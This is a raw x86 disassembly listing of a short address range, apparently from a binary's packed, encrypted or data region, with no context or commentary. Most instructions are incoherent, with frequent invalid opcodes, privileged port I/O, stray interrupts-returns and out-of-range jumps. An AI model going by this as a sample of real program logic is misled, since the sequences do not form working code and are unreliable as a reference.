  41135c:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4d]
  411363:	cmp    dh,BYTE PTR [edx+0xf]
  411366:	add    ah,dl
  411368:	rol    DWORD PTR [eax],0x4d
  41136b:	mov    ecx,DWORD PTR [ebx-0x75ffcc08]
  411371:	(bad)  
  411372:	or     eax,0x497284
  411377:	xor    al,cl
  411379:	mov    ecx,DWORD PTR [ebp-0x18]
  41137c:	mov    ecx,DWORD PTR [ecx]
  41137e:	xor    ecx,edi
  411380:	mov    cl,BYTE PTR [ebp+ecx*1+0x327249]
  411387:	xor    cl,al
  411389:	mov    edx,DWORD PTR [eax]
  41138b:	in     al,0x45
  41138d:	or     DWORD PTR [eax-0x31],edx
  411390:	mov    ds:0x8b49ff8c,eax
  411395:	xor    dh,BYTE PTR [edx+ecx*1-0x17f5743f]
  41139c:	inc    ebp
  41139d:	or     DWORD PTR [ebx],esi
  41139f:	iret   
  4113a0:	add    ecx,DWORD PTR [ecx+ecx*4+0x4532144d]
  4113a7:	cmp    dh,BYTE PTR [ebx]
  4113a9:	jge    0x7241443f
  4113af:	mov    eax,DWORD PTR [eax]
  4113b1:	in     al,0xc7
  4113b3:	add    BYTE PTR [ebp-0x39],cl
  4113b6:	mov    eax,DWORD PTR [esp+edx*1-0x34cd30b7]
  4113bd:	mov    edx,ecx
  4113bf:	clc    
  4113c0:	test   BYTE PTR [ecx],cl
  4113c2:	std    
  4113c3:	iret   
  4113c4:	dec    DWORD PTR [ebp+eax*2+0x14328b49]
  4113cb:	xor    al,bh
  4113cd:	mov    eax,ebx
  4113cf:	in     al,dx
  4113d0:	enter  0x1109,0xcf
  4113d4:	inc    ebp
  4113d5:	mov    WORD PTR [ebx-0x38cde7b7],cs
  4113db:	or     al,BYTE PTR [ebx+ecx*4+0x932f89d]
  4113e2:	jmp    0x4113b3
  4113e4:	push   0xffffff8c
  4113e6:	dec    DWORD PTR [ebp-0xc]
  4113e9:	xor    al,BYTE PTR [ebp+0x3a]
  4113ec:	push   eax
  4113ed:	jne    0x411409
  4113ef:	mov    edi,edi
  4113f1:	in     al,0x8b
  4113f3:	add    BYTE PTR [eax],cl
  4113f5:	(bad)  
  4113f6:	dec    ebp
  4113f7:	test   BYTE PTR [ebx],dh
  4113f9:	dec    ecx
  4113fa:	add    esi,DWORD PTR [edx]
  4113fc:	cmp    ecx,DWORD PTR [ebx+0x98bec74]
  411402:	or     bh,cl
  411404:	(bad)  
  411405:	mov    ebx,es
  411407:	dec    ecx
  411408:	push   0x32
  41140a:	lea    esi,[edx]
  41140c:	xchg   esp,eax
  41140d:	mov    ebp,eax
  41140f:	call   0xd0401e0c
  411414:	inc    ebp
  411415:	mov    WORD PTR [ebx+0x45321849],es
  41141b:	or     bh,bh
  41141d:	mov    ebp,DWORD PTR [eax-0x74f68a1c]
  411423:	iret   
  411424:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411425:	mov    WORD PTR [ebp+0x4d],es
  411428:	push   eax
  411429:	xor    bl,dh
  41142b:	cmp    bh,bh
  41142d:	jne    0x4113ba
  41142f:	lea    ecx,[eax]
  411431:	lods   al,BYTE PTR ds:[esi]
  411432:	dec    ebp
  411433:	call   0xff450e6b
  411438:	cmp    ecx,DWORD PTR [ebp+0x74]
  41143b:	cmp    ebp,DWORD PTR [edx+0x74]
  41143e:	dec    DWORD PTR [ebx-0x38baf758]
  411444:	add    eax,ebx
  411446:	fadd   DWORD PTR [ebp-0x18]
  411449:	mov    edi,eax
  41144b:	lock inc edi
  41144e:	inc    ebp
  41144f:	test   BYTE PTR [ebx+0x832a89d],cl
  411455:	xor    eax,DWORD PTR [ebp-0x75]
  411458:	add    ecx,DWORD PTR [eax]
  41145a:	sbb    BYTE PTR [ebp+0x45],dl
  41145d:	xor    ecx,DWORD PTR [ebx+0x4d3bf003]
  411463:	rdpmc  
  411465:	test   DWORD PTR [ebx],0xc18b0fff
  41146b:	or     BYTE PTR [ebp+0x4d],cl
  41146e:	mov    esi,DWORD PTR [ebx]
  411470:	rol    BYTE PTR [ebx],1
  411472:	iret   
  411473:	cmp    ecx,DWORD PTR [ebp+esi*2-0xfcd7463]
  41147a:	cmp    ecx,DWORD PTR [ebp+0xf]
  41147d:	xor    edx,DWORD PTR [edi-0x73]
  411480:	dec    DWORD PTR [eax]
  411482:	mov    esi,DWORD PTR [edx+0x10]
  411485:	add    BYTE PTR [ebp+0x77],al
  411488:	mov    DWORD PTR [eax],ebx
  41148a:	jmp    0x411501
  41148c:	or     DWORD PTR [ebp-0x179b6b64],0xff65f3bf
  411496:	pop    edi
  411497:	inc    ebp
  411498:	pop    ebx
  411499:	mov    eax,edx
  41149b:	loopne 0x41149d
  41149d:	(bad)  
  41149e:	mov    eax,ebx
  4114a0:	push   ecx
  4114a1:	ror    DWORD PTR [ebx+0x4d450813],0x33
  4114a8:	push   esi
  4114a9:	add    edi,DWORD PTR [edi+0x7180850]
  4114af:	inc    ebp
  4114b0:	(bad)  
  4114b1:	push   eax
  4114b2:	popf   
  4114b3:	dec    edi
  4114b4:	xor    bh,bh
  4114b6:	add    ecx,DWORD PTR [ebx-0x3f740b77]
  4114bc:	adc    al,0x89
  4114be:	adc    BYTE PTR [ecx+eax*1],0x75
  4114c2:	add    bh,bh
  4114c4:	or     BYTE PTR [eax*2-0x6bfc74bb],dl
  4114cb:	fadd   DWORD PTR [eax]
  4114cd:	call   0xff45075d
  4114d2:	cmp    al,0x45
  4114d4:	dec    ebp
  4114d5:	mov    ecx,DWORD PTR [ebx+0xc7d8e0]
  4114db:	ret    
  4114dc:	mov    eax,ecx
  4114de:	adc    al,0x11
  4114e0:	add    al,0x0
  4114e2:	add    BYTE PTR [ebp+0x0],dh
  4114e5:	mov    edi,edi
  4114e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114e8:	push   eax
  4114e9:	inc    ebp
  4114ea:	add    BYTE PTR [eax-0x2f],dl
  4114ed:	adc    eax,0x8b45ff03
  4114f2:	xor    edx,esp
  4114f4:	add    ecx,DWORD PTR [ebp-0x77]
  4114f7:	add    esp,edi
  4114f9:	mov    eax,DWORD PTR [ebp-0x58]
  4114fc:	inc    DWORD PTR [ebp+0x14]
  4114ff:	mov    DWORD PTR [ebp+0x18],eax
  411502:	push   eax
  411503:	inc    ebp
  411504:	dec    DWORD PTR [ebx-0x388ae7f4]
  41150a:	call   0xfff10fd2
  41150f:	mov    eax,DWORD PTR [ebp+0x8]
  411512:	mov    edx,DWORD PTR [ebp+0x33]
  411515:	xor    eax,DWORD PTR [ebx]
  411517:	lea    edi,[ebx]
  411519:	adc    DWORD PTR [edx+esi*2-0x75],esi
  41151d:	add    BYTE PTR [ecx+eax*8],cl
  411520:	dec    ebp
  411521:	xor    BYTE PTR [ebx],0xfc
  411524:	add    edi,edi
  411526:	pcmpeqw mm0,QWORD PTR [ebp-0x75]
  41152a:	mov    eax,ebx
  41152c:	pop    edi
  41152d:	push   es
  41152e:	leave  
  41152f:	or     dl,BYTE PTR [eax]
  411531:	xor    eax,0x7fec2d55
  411536:	in     al,0xec
  411538:	adc    DWORD PTR [edx+0x14],0x5e
  41153c:	xor    eax,0x53149cc9
  411541:	push   ebp
  411542:	dec    esp
  411543:	in     al,dx
  411544:	or     BYTE PTR [ecx+0x57],dl
  411547:	inc    ebp
  411548:	inc    ecx
  411549:	mov    ecx,DWORD PTR [ecx-0x74a8dbf0]
  41154f:	push   esi
  411550:	and    al,0x51
  411552:	mov    edx,0x7be0833
  411557:	jb     0x411553
  411559:	add    BYTE PTR [ebp+0x30132c6],bl
  41155f:	inc    ebp
  411560:	mov    DWORD PTR [ebx+0x8b9424],ecx
  411566:	or     al,0x8b
  411568:	jl     0x4114f5
  41156a:	sbb    al,0x14
  41156c:	dec    ebp
  41156d:	xor    BYTE PTR [ebp+0x1],0x8b
  411571:	add    BYTE PTR [eax+eax*1],ah
  411574:	xor    eax,DWORD PTR [ecx-0x75]
  411577:	mov    esp,DWORD PTR [esp+edx*1]
  41157a:	add    ecx,DWORD PTR [ecx+0xca010f]
  411580:	dec    esp
  411581:	dec    ecx
  411582:	adc    BYTE PTR [edx-0x15],ch
  411585:	push   0x103039
  41158a:	sbb    al,0x70
  41158c:	inc    esp
  41158d:	push   0x10
  41158f:	dec    DWORD PTR [ecx+ecx*4+0x18]
  411593:	mov    eax,edx
  411595:	or     BYTE PTR [edi+eax*8+0x4532c69d],al
  41159c:	mov    DWORD PTR [ebx+0x75681024],ecx
  4115a2:	test   DWORD PTR [ebp+0x530efcf8],ecx
  4115a8:	jge    0x41161f
  4115aa:	xor    edi,edi
  4115ac:	pushf  
  4115ad:	or     BYTE PTR [ebp+0x6c],dh
  4115b0:	push   0xf88b85ff
  4115b5:	or     BYTE PTR [ebp+0xb],dh
  4115b8:	inc    edi
  4115ba:	or     dh,al
  4115bc:	jb     0x411586
  4115be:	call   DWORD PTR [eax]
  4115c0:	mov    DWORD PTR [ebp+0x24],eax
  4115c3:	mov    ebp,ebx
  4115c5:	adc    bh,bh
  4115c7:	(bad)  
  4115c8:	and    al,0xc6
  4115ca:	lea    ebp,[edi+0x1fffc24]
  4115d0:	or     BYTE PTR [esi+0x74],bl
  4115d3:	ret    0x20
  4115d6:	je     0x411563
  4115d8:	sbb    al,0x83
  4115da:	mov    edi,0xe8ecfff8
  4115df:	mov    ecx,0xf81485ff
  4115e4:	je     0x41156f
  4115e6:	pop    esp
  4115e7:	and    al,0x75
  4115e9:	push   esi
  4115ea:	and    al,0x8d
  4115ec:	and    al,0xfd
  4115ee:	inc    BYTE PTR [ebx+ecx*4+0x18]
  4115f2:	and    al,0x7c
  4115f4:	pop    edi
  4115f5:	adc    BYTE PTR [ebx+0x56],bl
  4115f8:	in     eax,0x51
  4115fa:	ret    0x33
  4115fd:	mov    esi,0x187200
  411602:	pushf  
  411603:	inc    BYTE PTR [ecx+0x1614857c]
  411609:	jge    0x4115a7
  41160b:	mov    DWORD PTR [esp],ecx
  41160e:	(bad)  
  41160f:	cmp    DWORD PTR [eax],ebx
  411611:	adc    BYTE PTR [eax],bl
  411613:	push   ss
  411614:	dec    DWORD PTR [edi+edi*8+0x18]
  411618:	adc    al,0xca
  41161a:	mov    edx,DWORD PTR [esp+ecx*1+0x10]
  41161e:	into   
  41161f:	scas   eax,DWORD PTR es:[edi]
  411620:	mov    DWORD PTR [eax+edx*2],esp
  411623:	das    
  411624:	inc    ebp
  411625:	jne    0x4115b2
  411627:	and    al,0x8b
  411629:	and    al,0x33
  41162b:	lea    ecx,[eax]
  41162d:	jb     0x411673
  41162f:	xor    ebp,ebx
  411631:	adc    al,bh
  411633:	xor    bh,bh
  411635:	jne    0x41167b
  411637:	sbb    al,0xff
  411639:	.byte 0xe8
  41163a:	inc    esp
  41163b:	pop    esi
  41163c:	pop    ebp
